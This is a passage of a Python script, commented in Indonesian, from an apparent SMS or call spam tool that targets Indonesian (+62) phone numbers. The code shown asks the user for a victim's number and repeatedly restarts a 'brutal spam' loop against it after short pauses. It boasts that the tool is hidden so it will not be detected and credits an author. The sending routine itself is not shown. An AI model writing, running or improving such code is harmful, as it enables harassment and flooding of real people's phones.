                start(nomor,1) # Fungsi start() dengan membawa parameter (nomor target, flag 1 yang berarti bukan perama kali masuk kedalam fungsi start())

                   #boleh di Diubah
    def start(nomor,x):
        if x == 0:
            os.system("cls") # Clear Terminal
            autoketik(f"{biru}brutal spam Untuk {putih}{nomor} {biru}sudah {merah}SIAP{merah}") # Flag dimana program berjalan
            jam(nomor)
        else:
            print("")
            autoketik("--reboot tunggu 20 detik--")
            time.sleep(15)
            os.system("cls")
            autoketik(f"{merah}Mengulang Spam ke Nomor : {nomor}.....{hijau}")
            jam(nomor)

    def main():
        os.system("")
        autoketik(f"tools telah di amankan agar tidak ketahuan ")
        print(f"""tools ini hanya khusus nomer +62
            {biru}author : {merah}johan libert
            {biru}github : {merah}https://github.com/johanlibert143
            {merah}version : {biru} ver alpha 1.2.2
            {merah}contoh nomer untuk di spam 0*********** """)

        print(nomor := input(f"{merah}Masukkan Nomor untuk di spam: {biru}"))
        start(nomor,0)
try:
    main()
except KeyboardInterrupt:
    autoketik(f"""{merah}batal
{hijau}--Keluar Dari Tools--""")
    sys.exit()
